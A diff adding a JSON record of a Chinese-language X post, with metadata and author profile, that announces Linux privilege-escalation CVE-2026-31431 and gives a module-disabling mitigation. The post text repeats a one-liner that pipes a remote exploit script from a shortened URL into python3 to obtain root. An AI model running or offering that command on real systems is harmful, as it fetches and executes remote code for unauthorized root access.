@@ -1,0 +1,355 @@
+{
+  "data": {
+    "article": {},
+    "attachments": {
+      "media_keys": [
+        "3_2049737304483528704"
+      ]
+    },
+    "author_id": "1165044876297134080",
+    "context_annotations": [
+      {
+        "domain": {
+          "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+          "id": "46",
+          "name": "Business Taxonomy"
+        },
+        "entity": {
+          "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to offline and online games such as gaming consoles, tabletop games, video game publishers",
+          "id": "1557696940178935808",
+          "name": "Gaming Business"
+        }
+      },
+      {
+        "domain": {
+          "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+          "id": "46",
+          "name": "Business Taxonomy"
+        },
+        "entity": {
+          "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to softwares, apps, communication equipments, hardwares",
+          "id": "1557697333571112960",
+          "name": "Technology Business"
+        }
+      },
+      {
+        "domain": {
+          "description": "Entity Service top level domain, every item that is in Entity Service should be in this domain",
+          "id": "30",
+          "name": "Entities [Entity Service]"
+        },
+        "entity": {
+          "description": "Technology and computing",
+          "id": "848920371311001600",
+          "name": "Technology"
+        }
+      },
+      {
+        "domain": {
+          "description": "A grouping of interests and hobbies entities, like Novelty Food or Destinations",
+          "id": "66",
+          "name": "Interests and Hobbies Category"
+        },
+        "entity": {
+          "description": "Linux",
+          "id": "848959431836487680",
+          "name": "Linux"
+        }
+      },
+      {
+        "domain": {
+          "description": "A taxonomy of user interests. ",
+          "id": "131",
+          "name": "Unified Twitter Taxonomy"
+        },
+        "entity": {
+          "description": "Linux",
+          "id": "848959431836487680",
+          "name": "Linux"
+        }
+      }
+    ],
+    "conversation_id": "2049737746563158361",
+    "created_at": "2026-04-30T06:28:55.000Z",
+    "edit_controls": {
+      "editable_until": "2026-04-30T07:28:55.000Z",
+      "edits_remaining": 5,
+      "is_edit_eligible": true
+    },
+    "edit_history_tweet_ids": [
+      "2049737746563158361"
+    ],
+    "entities": {
+      "urls": [
+        {
+          "description": "Xint Code disclosed CVE-2026-31431, an authencesn scratch-write bug chaining AF_ALG + splice() into a 4-byte page cache write. A 732-byte PoC gets root on Ubuntu, Amazon Linux, RHEL, SUSE. | AI for Security, Vulnerability Research",
+          "display_url": "copy.fail/exp",
+          "end": 100,
+          "expanded_url": "https://copy.fail/exp",
+          "start": 77,
+          "status": 200,
+          "title": "Copy Fail: 732 Bytes to Root on Every Major Linux Distributions - Xint",
+          "unwound_url": "https://xint.io/blog/copy-fail-linux-distributions",
+          "url": "https://t.co/ugdmOyLMqI"
+        },
+        {
+          "display_url": "pic.x.com/tYgXFQTs2q",
+          "end": 226,
+          "expanded_url": "https://x.com/realNyarime/status/2049737746563158361/photo/1",
+          "media_key": "3_2049737304483528704",
+          "start": 203,
+          "url": "https://t.co/tYgXFQTs2q"
+        }
+      ]
+    },
+    "geo": {},
+    "id": "2049737746563158361",
+    "lang": "zh",
+    "note_tweet": {
+      "entities": {
+        "urls": [
+          {
+            "display_url": "copy.fail/exp",
+            "end": 100,
+            "expanded_url": "https://copy.fail/exp",
+            "start": 77,
+            "url": "https://t.co/eApW9Zczy5"
+          },
+          {
+            "display_url": "xint.io/blog/copy-fail…",
+            "end": 291,
+            "expanded_url": "https://xint.io/blog/copy-fail-linux-distributions",
+            "start": 268,
+            "url": "https://t.co/iezazdMpAT"
+          }
+        ]
+      },
+      "text": "看到Xint Code研究团队放出的CVE-2026-31431简直是王炸，换句话说通杀所有Linux发行版，致使低权限账户获得root权限：\ncurl https://t.co/eApW9Zczy5 | python3 && su CVE-2026-31431\n建议尽快更新系统，事态紧急可以先打个补丁\necho \"install algif_aead /bin/false\" > /etc/modprobe.d/disable-algif-aead.conf\nrmmod algif_aead 2>/dev/null\n\n详细参考👉 https://t.co/iezazdMpAT"
+    },
+    "possibly_sensitive": false,
+    "public_metrics": {
+      "bookmark_count": 0,
+      "impression_count": 0,
+      "like_count": 0,
+      "quote_count": 0,
+      "reply_count": 0,
+      "retweet_count": 0
+    },
+    "reply_settings": "everyone",
+    "text": "看到Xint Code研究团队放出的CVE-2026-31431简直是王炸，换句话说通杀所有Linux发行版，致使低权限账户获得root权限：\ncurl https://t.co/ugdmOyLMqI | python3 &amp;&amp; su CVE-2026-31431\n建议尽快更新系统，事态紧急可以先打个补丁\necho \"install algif_aead /bin/false\" &gt; https://t.co/tYgXFQTs2q"
+  },
+  "includes": {
+    "media": [
+      {
+        "height": 1448,
+        "media_key": "3_2049737304483528704",
+        "public_metrics": {},
+        "type": "photo",
+        "url": "https://pbs.twimg.com/media/HHIhN-ybgAASXhN.jpg",
+        "width": 1086
+      }
+    ],
+    "tweets": [
+      {
+        "article": {},
+        "attachments": {
+          "media_keys": [
+            "3_2049737304483528704"
+          ]
+        },
+        "author_id": "1165044876297134080",
+        "context_annotations": [
+          {
+            "domain": {
+              "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+              "id": "46",
+              "name": "Business Taxonomy"
+            },
+            "entity": {
+              "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to offline and online games such as gaming consoles, tabletop games, video game publishers",
+              "id": "1557696940178935808",
+              "name": "Gaming Business"
+            }
+          },
+          {
+            "domain": {
+              "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+              "id": "46",
+              "name": "Business Taxonomy"
+            },
+            "entity": {
+              "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to softwares, apps, communication equipments, hardwares",
+              "id": "1557697333571112960",
+              "name": "Technology Business"
+            }
+          },
+          {
+            "domain": {
+              "description": "Entity Service top level domain, every item that is in Entity Service should be in this domain",
+              "id": "30",
+              "name": "Entities [Entity Service]"
+            },
+            "entity": {
+              "description": "Technology and computing",
+              "id": "848920371311001600",
+              "name": "Technology"
+            }
+          },
+          {
+            "domain": {
+              "description": "A grouping of interests and hobbies entities, like Novelty Food or Destinations",
+              "id": "66",
+              "name": "Interests and Hobbies Category"
+            },
+            "entity": {
+              "description": "Linux",
+              "id": "848959431836487680",
+              "name": "Linux"
+            }
+          },
+          {
+            "domain": {
+              "description": "A taxonomy of user interests. ",
+              "id": "131",
+              "name": "Unified Twitter Taxonomy"
+            },
+            "entity": {
+              "description": "Linux",
+              "id": "848959431836487680",
+              "name": "Linux"
+            }
+          }
+        ],
+        "conversation_id": "2049737746563158361",
+        "created_at": "2026-04-30T06:28:55.000Z",
+        "edit_controls": {
+          "editable_until": "2026-04-30T07:28:55.000Z",
+          "edits_remaining": 5,
+          "is_edit_eligible": true
+        },
+        "edit_history_tweet_ids": [
+          "2049737746563158361"
+        ],
+        "entities": {
+          "urls": [
+            {
+              "description": "Xint Code disclosed CVE-2026-31431, an authencesn scratch-write bug chaining AF_ALG + splice() into a 4-byte page cache write. A 732-byte PoC gets root on Ubuntu, Amazon Linux, RHEL, SUSE. | AI for Security, Vulnerability Research",
+              "display_url": "copy.fail/exp",
+              "end": 100,
+              "expanded_url": "https://copy.fail/exp",
+              "start": 77,
+              "status": 200,
+              "title": "Copy Fail: 732 Bytes to Root on Every Major Linux Distributions - Xint",
+              "unwound_url": "https://xint.io/blog/copy-fail-linux-distributions",
+              "url": "https://t.co/ugdmOyLMqI"
+            },
+            {
+              "display_url": "pic.x.com/tYgXFQTs2q",
+              "end": 226,
+              "expanded_url": "https://x.com/realNyarime/status/2049737746563158361/photo/1",
+              "media_key": "3_2049737304483528704",
+              "start": 203,
+              "url": "https://t.co/tYgXFQTs2q"
+            }
+          ]
+        },
+        "geo": {},
+        "id": "2049737746563158361",
+        "lang": "zh",
+        "note_tweet": {
+          "entities": {
+            "urls": [
+              {
+                "display_url": "copy.fail/exp",
+                "end": 100,
+                "expanded_url": "https://copy.fail/exp",
+                "start": 77,
+                "url": "https://t.co/eApW9Zczy5"
+              },
+              {
+                "display_url": "xint.io/blog/copy-fail…",
+                "end": 291,
+                "expanded_url": "https://xint.io/blog/copy-fail-linux-distributions",
+                "start": 268,
+                "url": "https://t.co/iezazdMpAT"
+              }
+            ]
+          },
+          "text": "看到Xint Code研究团队放出的CVE-2026-31431简直是王炸，换句话说通杀所有Linux发行版，致使低权限账户获得root权限：\ncurl https://t.co/eApW9Zczy5 | python3 && su CVE-2026-31431\n建议尽快更新系统，事态紧急可以先打个补丁\necho \"install algif_aead /bin/false\" > /etc/modprobe.d/disable-algif-aead.conf\nrmmod algif_aead 2>/dev/null\n\n详细参考👉 https://t.co/iezazdMpAT"
+        },
+        "possibly_sensitive": false,
+        "public_metrics": {
+          "bookmark_count": 0,
+          "impression_count": 0,
+          "like_count": 0,
+          "quote_count": 0,
+          "reply_count": 0,
+          "retweet_count": 0
+        },
+        "reply_settings": "everyone",
+        "text": "看到Xint Code研究团队放出的CVE-2026-31431简直是王炸，换句话说通杀所有Linux发行版，致使低权限账户获得root权限：\ncurl https://t.co/ugdmOyLMqI | python3 &amp;&amp; su CVE-2026-31431\n建议尽快更新系统，事态紧急可以先打个补丁\necho \"install algif_aead /bin/false\" &gt; https://t.co/tYgXFQTs2q"
+      }
+    ],
+    "users": [
+      {
+        "created_at": "2019-08-23T23:35:25.000Z",
+        "derived": {
+          "locations": [
+            {
+              "country_code": "CN",
+              "full_name": "Xiamen, Fujian, China",
+              "geo": {
+                "coordinates": [
+                  118.08187,
+                  24.47979
+                ],
+                "type": "Point"
+              },
+              "locality": "Xiamen",
+              "region": "Fujian"
+            }
+          ]
+        },
+        "description": "乃月希, aka Nyarime｜Founder of Naixi Networks｜Developer｜ Photographer｜可以叫我希酱｜玩eSIM上奶昔论坛｜zh-cn/en｜❤️ @realYingxi",
+        "entities": {
+          "description": {
+            "mentions": [
+              {
+                "end": 108,
+                "start": 97,
+                "username": "realYingxi"
+              }
+            ]
+          },
+          "url": {
+            "urls": [
+              {
+                "display_url": "naixi.net",
+                "end": 23,
+                "expanded_url": "https://naixi.net",
+                "start": 0,
+                "url": "https://t.co/Gp1bHdXykZ"
+              }
+            ]
+          }
+        },
+        "id": "1165044876297134080",
+        "location": "Xiamen, Fujian, PR. China",
+        "name": "奶昔🥤",
+        "profile_image_url": "https://pbs.twimg.com/profile_images/2037172678558425088/ZVuft4sK_normal.jpg",
+        "protected": false,
+        "public_metrics": {
+          "followers_count": 31412,
+          "following_count": 586,
+          "like_count": 13273,
+          "listed_count": 154,
+          "media_count": 1617,
+          "tweet_count": 10852
+        },
+        "url": "https://t.co/Gp1bHdXykZ",
+        "username": "realNyarime",
+        "verified": true
+      }
+    ]
+  }
+}
